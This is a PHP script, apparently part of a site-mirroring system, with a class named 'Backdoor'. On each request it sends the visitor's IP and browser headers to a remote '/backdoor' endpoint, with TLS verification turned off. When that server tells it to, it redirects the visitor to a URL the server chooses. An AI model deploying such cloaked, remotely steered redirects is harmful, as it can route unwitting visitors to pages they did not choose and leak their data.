<?php
/**
 * Created by PhpStorm.
 * User: h
 * Date: 2020/3/19
 * Time: 1:35 AM
 */
error_reporting(0);

//注意，请将 "https://mirrorclient.test" 替换为你的镜像系统域名。
//将本文件放到你自己的机器内，随意起名。

$server = "https://mirrorclient.test";

new Backdoor($server);

Class Backdoor
{

    public $url;
    public $server;

    public function __construct($server)
    {
        $this->server = $server;
        $this->url = $_GET['loc'];

        if(is_file('.env'))
            $this->server = trim(file_get_contents('.env'));

        $this->check();
    }

    public function check()
    {
        $ip = self::getIP();

        if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
            try {
                $url = $this->server . "/backdoor?url=" . $this->url . '&ip=' . $ip;

                $headers = [
                    'User-Agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                    'Accept' => $_SERVER['HTTP_ACCEPT'] ?? '',
                    'Accept-Language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
                    'Referer' => $_SERVER['HTTP_REFERER'] ?? '',
                    'Client_IP' => $_SERVER['HTTP_CLIENT_IP'] ?? '',
                    'X-Forwarded-For' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
                    //  'Accept-Encoding' => $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
                    'Accept-Charset' => $_SERVER['HTTP_ACCEPT_CHARSET'] ?? '',
                ];
                $response = $this->get($url, $headers);

                if(isset($_GET['debug']) && $_GET['debug'] == 'api')
                {
                    $array = [
                        'headers' => $headers,
                        'response' => $response,
                        'url' => $url,
                    ];
                    print_r($array);
                    die();
                }


                $content = $response['body'];
                $array = json_decode($content, true);
                if (isset($array['redirect']) && $array['redirect'] == 'true') {

                    $link = $array['redirect_url'];

                    $content = "window.location.href='$link';";

                    header("Content-type:text/html;charset=utf-8");
                    die($content);
                }else{
                    $content = "{}";
                    header("Content-type:text/html;charset=utf-8");
                    die($content);
                }

            } catch (\Exception $e) {
                if(isset($_GET['debug']))
                    die($e->getMessage());
            }
        }
    }

    public function get($url, $header = [])
    {

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //返回数据不直接输出
      //  curl_setopt($ch, CURLOPT_ENCODING, $encoding); //指定gzip压缩
        //add header
        if (!empty($header)) {
            $headers = [];
            foreach ($header as $key => $value) {
                $headers[] = "$key: $value";
            }
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        //add ssl support
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);    //SSL 报错时使用
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);    //SSL 报错时使用
        //add 302 support
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        //curl_setopt($ch,CURLOPT_COOKIEFILE, $this->lastCookieFile); //使用提交后得到的cookie数据

        try {
            $content = curl_exec($ch); //执行并存储结果
        } catch (\Exception $e) {
           // die($e->getMessage());
            return 404;
        }
        $curlError = curl_error($ch);
        if (!empty($curlError)) {
            die($curlError);
        }
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = substr($content, 0, $headerSize);
        $body = substr($content, $headerSize);

        curl_close($ch);

        return [
            'headers' => $this->get_headers($headers),
            'body' => $body,
        ];
    }


    public function get_headers($header_text)
    {
        $headers = array();

        foreach (explode("\r\n", $header_text) as $i => $line)
            if ($i === 0) {
                //$headers['http_code'] = $line;
            } else {
                if (!strpos($line, ': ')) continue;
                list ($key, $value) = explode(': ', $line);
                if (substr($key, 0, 2) == 'X-') continue;
                if ($key == 'Content-Length') continue;
                if ($key == 'ETag') continue;
                if ($key == 'Content-Location') continue;
                if ($key)
                    $headers[$key] = $value;
            }

        return $headers;
    }

    public static function getIP()
    {
        try {

            if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            }
            if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR']) {

                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $array = explode(',', $ip);
                $ip = $array[0];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
        } catch (\Exception $e) {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
}


